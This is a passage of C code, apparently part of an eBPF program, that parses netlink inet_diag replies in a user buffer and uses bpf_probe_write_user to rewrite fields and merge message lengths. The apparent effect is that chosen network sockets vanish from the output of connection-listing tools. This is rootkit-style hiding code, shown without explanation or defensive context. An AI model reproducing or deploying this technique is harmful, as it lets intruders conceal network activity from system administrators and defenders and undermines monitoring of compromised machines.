                bpf_probe_write_user(iov_base+offset+sizeof(msghdr)+offsetof(struct inet_diag_msg, idiag_wqueue), &idiag_wqueue, sizeof(uint32_t));
            }
            else if (!change_me && !new_msglen) {
                change_me = last_offest;
                new_msglen = last_msglen + msghdr.nlmsg_len;
            }
            else {
                new_msglen += msghdr.nlmsg_len;
            }
        }
        else if (change_me || new_msglen) {
            bpf_probe_write_user(iov_base+change_me+offsetof(struct nlmsghdr, nlmsg_len), &new_msglen, sizeof(uint32_t));
            change_me = 0;
            new_msglen = 0;
        }

        last_offest = offset;
        last_msglen = msghdr.nlmsg_len;
        offset += msghdr.nlmsg_len;
    }

    return 0;
}
